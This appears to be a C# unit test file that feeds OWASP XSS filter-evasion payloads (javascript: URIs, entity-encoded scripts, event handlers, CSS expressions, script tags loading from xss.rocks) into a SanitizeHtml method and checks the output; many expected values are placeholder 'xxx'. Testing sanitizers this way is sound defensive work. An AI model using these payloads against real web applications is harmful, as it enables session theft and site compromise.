...
namespace UnitTestProject1
{
    ...
    public class OwaspOrgXssFilterEvasionCheatSheet
    {
        ...
        {
            var actual = "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>".SanitizeHtml();
            var expected = "<img>";
        ...
        {
            var actual = "<IMG \"\"\" >< SCRIPT > alert(\"XSS\") </ SCRIPT > \">".SanitizeHtml();
            var expected = "<img>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = $"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&{Environment.NewLine}#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>".SanitizeHtml();
            var expected = "<img>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>".SanitizeHtml();
            var expected = "<img>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "perl -e 'print \" < IMG SRC = java\0script: alert(\\\"XSS\\\")>\"; ' > out\">".SanitizeHtml();
            var expected = "perl -e 'print <img> out";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<IMG SRC=\" &#14;  javascript:alert('XSS');\">".SanitizeHtml();
            var expected = "<img>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<iframe src=http://xss.rocks/scriptlet.html <".SanitizeHtml();
            var expected = "<iframe src=\"http://xss.rocks/scriptlet.html\">";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "\\\"; alert('XSS');//".SanitizeHtml();
            var expected = "";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<STYLE>li {list - style - image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<IMG SRC=\"livescript:[code]\">".SanitizeHtml();
            var expected = "<img>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "Set.constructor`alert\x28document.domain\x29```".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<BR SIZE=\"&{alert('XSS')}\">".SanitizeHtml();
            var expected = "<br>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<STYLE>BODY{-moz - binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<STYLE>@im\\port'\\ja\vasc\\ript:alert(\"XSS\")';</STYLE>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<STYLE>.XSS{background - image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>".SanitizeHtml();
            var expected = $"xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        public void META()
        {
            var actual = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<DIV STYLE=\"width: expression(alert('XSS'));\">".SanitizeHtml();
        ...
        {
            var actual = $"a=\"get\";{Environment.NewLine}b=\"URL(\\\"\";{Environment.NewLine}c=\"javascript:\";{Environment.NewLine}d=\"alert('XSS');\\\")\";{Environment.NewLine}eval(a+b+c+d);".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = $"<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>{Environment.NewLine}<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>".SanitizeHtml();
        ...
        {
            var actual = $"<HTML><BODY>{Environment.NewLine}<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">{Environment.NewLine}<?import namespace=\"t\" implementation=\"#default#time2\">{Environment.NewLine}<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">{Environment.NewLine}</BODY></HTML>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        public void PHP()
        {
            var actual = $"<? echo('<SCR)';{Environment.NewLine}echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">".SanitizeHtml();
            var expected = "<img>";
            Assert.AreEqual(expected, actual);
        }
        ...
        {
            var actual = "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->".SanitizeHtml();
            var expected = "xxx";
            Assert.AreEqual(expected, actual);
        }
        ...
        public class PassedTests
        {
            ...
            {
                var actual = "<XSS STYLE=\"xss:expression(alert('XSS'))\">".SanitizeHtml();
            ...
            {
                var actual = "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            public void BASETag()
            {
                var actual = "<BASE HREF=\"javascript:alert('XSS');//\">".SanitizeHtml();
                var expected = "<base>";
                Assert.AreEqual(expected, actual);
            }
            ...
            public void BGSOUND()
            {
                var actual = "<BGSOUND SRC=\"javascript:alert('XSS');\">".SanitizeHtml();
                var expected = "";   //-- Not in default whitelist as this tag is now Obsolete.
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<BODY BACKGROUND=\"javascript:alert('XSS')\">".SanitizeHtml();
            ...
            public void BODYTag()
            {
                var actual = "<BODY ONLOAD=alert('XSS')>".SanitizeHtml();
                var expected = "<body></body>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<IMG onmouseover=\"alert('xxs')\">".SanitizeHtml();
                var expected = "<img>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            public void FRAME()
            {
                var actual = "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>".SanitizeHtml();
                var expected = "<frameset><frame></frameset>";
                Assert.AreEqual(expected, actual);
            }
            ...
            public void IFRAME()
            {
                var actual = "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>".SanitizeHtml();
            ...
            {
                var actual = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>".SanitizeHtml();
                var expected = "<iframe src=\"#\"></iframe>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<IMG DYNSRC=\"javascript:alert('XSS')\">".SanitizeHtml();
                var expected = "<img>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<IMG LOWSRC=\"javascript:alert('XSS')\">".SanitizeHtml();
                var expected = "<img>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">".SanitizeHtml();
                var expected = "<img src=\"x\">";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">".SanitizeHtml();
                var expected = "";    //-- Input elements are not in the default whitelist.
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<a onmouseover=\"alert(document.cookie)\">xxs link</a>".SanitizeHtml();
                var expected = "<a>xxs link</a>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<SCRIPT SRC=http://xss.rocks/xss.js?< B >".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>".SanitizeHtml();
                var expected = "<body></body>";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>".SanitizeHtml();
                var expected = "";   //-- Object tag can contain dangerous objects and thus not in the whitelist.
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88, 83, 83))\"></img>".SanitizeHtml();
                var expected = "<img src=\"/\">";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<SCRIPT SRC=//xss.rocks/.j>".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">".SanitizeHtml();
                var expected = "<link rel=\"stylesheet\">";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>".SanitizeHtml();
                var expected = "";
                Assert.AreEqual(expected, actual);
            }
            ...
            {
                var actual = "<svg/onload=alert('XSS')>".SanitizeHtml();
                var expected = "";   //-- SVG tag is non-standard and thus not in default whitelist.
                Assert.AreEqual(expected, actual);
            }
            ...
            public void TABLE()
            {
                var actual = "<TABLE BACKGROUND=\"javascript:alert('XSS')\">".SanitizeHtml();
            ...
            public void TD()
            {
                var actual = "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">".SanitizeHtml();
            ...
            {
                var actual = "<IMG SRC='vbscript:msgbox(\"XSS\")'>".SanitizeHtml();
                var expected = "<img>";
                Assert.AreEqual(expected, actual);
            }
